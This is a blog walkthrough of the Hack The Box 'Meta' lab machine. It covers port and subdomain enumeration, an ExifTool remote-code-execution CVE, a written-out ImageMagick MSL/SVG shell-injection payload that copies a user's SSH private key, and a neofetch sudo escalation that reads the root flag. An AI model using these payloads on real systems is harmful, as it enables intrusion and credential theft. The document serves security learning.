---
title: Meta
tags: 
    - CVE-2021-22204
    - File Upload and Execution
    - ImageMagic
    - Neofetch
    - "Medium Machines"
categories:
    - "Hack The Box Writeup" 
date: 2022-02-07
description: "Hack The Box Machine - Meta writeup"
author: "Tejas"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
disableHLJS: false 
disableHLJS: false
hideSummary: true
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: false
UseHugoToc: true
cover:
    image: "https://pbs.twimg.com/media/FJehUQnXwA4d7Gi?format=jpg&name=medium" # image path/url
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
---

## Enumeration

### Open Ports

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiNHVBq9XNN5eXFkQosElagVm6qkXg6Iryueb1zAywZIA4b0dX+5xR5FpAxvYPxmthXA0E7/wunblfjPekyeKg+lvb+rEiyUJH25W/In13zRfJ6Su/kgxw9whZ1YUlzFTWDjUjQBij7QSMktOcQLi7zgrkG3cxGcS39SrEM8tvxcuSzMwzhFqVKFP/AM0jAxJ5HQVrkXkpGR07rgLyd+cNQKOGnFpAukUJnjdfv9PsV+LQs9p+a0jID+5B9y5fP4w9PvYZUkRGHcKCefYk/2UUVn0HesLNNrfo6iUxu+eeM9EGUtqQZ8nXI54nHOvzbc4aFbxADCfew/UJzQT7rovB
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEDINAHjreE4lgZywOGusB8uOKvVDmVkgznoDmUI7Rrnlmpy6DnOUhov0HfQVG6U6B4AxCGaGkKTbS0tFE8hYis=
|   256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdX83J9TLR63TPxQSvi3CuobX8uyKodvj26kl9jWUSq
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating Webpage

{{< figure src="images/Untitled.png">}}


[`http://meta.htb/`](http://meta.htb/)  redirects to `artcorp.htb` lets put the domain in hosts file. 

{{< figure src="images/Untitled%201.png">}}

### Subdomain Enumeration

It says artcorp is in startup phase and it should launch soon. And metaview to launch soon. So, I’m assuming the subdomain could be `metaview.artcorp.htb` or `meta.artcorp.htb` something similar maybe let me try those two first. 

Unfortunately not! They ain’t the subdomain. Ok, time to run ffuf.

{{< figure src="images/Untitled%202.png">}}


My guesses could be wild! But ffuf found a subdomain `dev01.artcorp.htb` lets enumerate it

### Enumerating Webpage - dev01.artcorp.htb

{{< figure src="images/Untitled%203.png">}}

I got this when I uploaded a *webp* file. So we now know its png and jpg **only.**

I then uploaded a jpg file, and it looked like normal metadata viewer 🤔

{{< figure src="images/Untitled%204.png">}}

I googled something like this and found some interesting results 

{{< figure src="images/Untitled%205.png">}}

After uploading the malicious evil.png for POC to check if the exploit worked I made the remote machine ping back my IP. And I captured it using tcpdump. Upon seeing the log from tcpdump I can confirm RCE worked. 

{{< figure src="images/Untitled%206.png">}}

## Foothold

Let’s exploit the RCE which we have found. 

I tried reversehll payloads based upon the [first article](https://shahjerry33.medium.com/remote-code-execution-via-exif-data-im-dangerous-43557d7f3e7a) for some reason it doesn’t give the shell. But I can ping 😑. Ok I think its djvu thing from hackerone [report](https://hackerone.com/reports/1154542) as it has CVE-2021-22204. 

Detail explanation about the is [here](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/). Now lets use the exploit POC from [github](https://github.com/se162xg/CVE-2021-22204)

 

### Exploiting CVE-2021-22204

I first tried this [POC](https://github.com/se162xg/CVE-2021-22204) and then [this](https://github.com/bilkoh/POC-CVE-2021-22204). Finally [this](https://github.com/convisolabs/CVE-2021-22204-exiftool) one worked.

change the IP and Port. Upload the image.

{{< figure src="images/Untitled%207.png">}}

{{< figure src="images/Untitled%208.png">}}

### www-data to thomas

I found a cron job running. Lets see what it is. 

{{< figure src="images/Untitled%209.png">}}

{{< figure src="images/Untitled%2010.png">}}

Its running ImageMagic `/usr/local/bin/mogrify`

{{< figure src="images/Untitled%2011.png">}}

{{< figure src="images/Untitled%2012.png">}}

### Exploiting ImageMagic

{{< figure src="images/Untitled%2013.png">}}

I found two articles interesting lets try them first. 

article [1](https://rhinosecuritylabs.com/research/imagemagick-exploit-remediation/) [2](https://portswigger.net/daily-swig/imagemagick-pdf-parsing-flaw-allowed-attacker-to-execute-shell-commands-via-maliciously-crafted-image)

Article 1 doesn’t seem to work for me. So I’m not posting the things I did.

I found a [poc](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html) close to article 2. Lets try it.

```xml
<image authenticate='ff" `echo $(id)> /dev/shm/tejas`;"'>  
<read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

{{< figure src="images/Untitled%2014.png">}}

Now I’ve RCE. Let’s exploit for shell as user Thomas.

Now let’s exfiltrate private key from thomas. 

```xml
<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
 <read filename="pdf:/etc/passwd"/>
 <get width="base-width" height="base-height" />
 <resize geometry="400x400" />
 <write filename="test.png" />
 <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink">
 <image xlink:href="msl:poc.svg" height="100" width="100"/>
 </svg>
</image>
```

After some time we’ll get the private key but its not formatted lets format it.

`echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa` 

`echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn <sniped> bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=" | sed 's/ /\n/g' >> id_rsa`  

`echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa`

{{< figure src="images/Untitled%2015.png">}}

User flag owned!

## Privilege Escalation

I found the following information. Let’s see what we can do. 

{{< figure src="images/Untitled%2016.png">}}

configuration file for neofetch is located in `$Home/.config/neofetch/config.conf`

Configuration file is very huge, and I’m not interested in reading them. But I feel whenever I run it with sudo config file of user root is used. How do I make the program use the config file from current user thomas 🤔.

What is `XDG_CONFIG_HOME`? I found it interesting and googled it. It seems that I can set the base dir of config file as a environment variable. ok let’s set our home directory as a config directory.

{{< figure src="images/Untitled%2017.png">}}

Now lets modify the config file a bit so our command is executed as root. I modified the neofetch’s config file with `cp /root/root.txt /dev/shm/root.txt && chmod 777 /dev/shm/root.txt`

And then lets run neofetch as sudo.

{{< figure src="images/Untitled%2018.png">}}

Root Flag owned!